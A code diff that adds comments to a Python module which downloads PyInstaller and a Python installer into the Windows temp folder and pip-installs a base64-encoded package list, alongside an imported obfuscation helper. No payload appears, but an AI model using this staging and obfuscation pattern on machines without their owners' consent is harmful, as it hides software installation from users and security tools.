@@ -12,6 +12,9 @@ from .pyinstaller_obfuscate.main import obfuscate_files
 def download_pyinstaller(download_path : str):
     """
     :param download_path: the assumed file name on the local system when downloaded
+    we return False, or path to the extracted_file
+    clean_path is the download_path --> but without the .zip suffix,
+    so clean path is actually the extraction dir!
     """
     URL = "https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v4.7.zip"
     clean_path = download_path.replace('.zip','')
@@ -20,8 +23,9 @@ def download_pyinstaller(download_path : str):
     if os.path.exists(clean_path):
         shutil.rmtree(clean_path)
     if download_file(clean_path,URL):
+        final_dir = clean_path.split('/')[::-1] #//TODO: check if this actually works!
         if extract_zip(f"c:/users/{os.getlogin()}/appdata/local/temp",clean_path):
-            return f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7"
+            return f"c:/users/{os.getlogin()}/appdata/local/temp/{final_dir}"
     return False
 
 
@@ -31,6 +35,7 @@ def get_pyinstaller(pythonPath:str,admin=True):
     """
     :param str pythonPath: abs path to python.exe
     :param bool admin: specify if we got admin permissions.
+    //TODO: create 3 functions from this one. one for each condition.
     """
     PATH = f"c:/users/{os.getlogin()}/appdata/local/temp/pyinstaller-4.7.zip"
     if not download_pyinstaller(PATH):
@@ -64,7 +69,11 @@ def get_pyinstaller(pythonPath:str,admin=True):
     pass
 def pip_install(new_path=None):
     # base64 encode&decode all commands here on runtime, to prevent obfuscation from obfuscating the packages to install
-    #//TODO: add doc
+    """
+    :param new_path: new path for pytohn.exe (called new_path as we assume we installed python!)
+    to_install is base64 encoded list of python packages to install with git
+     //TODO: change new_path name and arch to something more obious
+    """
     to_install = "Y3J5cHRvZ3JhcGh5IHRpbnlhZXMgbmV0aWZhY2VzIHJlcXVlc3RzIHBzdXRpbCBwYXRobGliMiB3aGVlbA=="
     if new_path:
         subprocess.run(
@@ -80,7 +89,13 @@ def pip_install(new_path=None):
 
 
 def install_python():
-    #//TODO: add doc
+    """
+    this function gets called if we didn't find any python installed.
+    we can install python with user and admin rights, here it's user only install!
+    //TODO: check if user is admin (pass it as param), and if admin then install the python as admin
+    //TODO: store urls in variables, strings are bad AF
+    //TODO: we always return True. WTF? we should check if installation succeed and return bool by that.
+    """
     os_p = 64
     if not is_os_64bit():
         os_p = 32
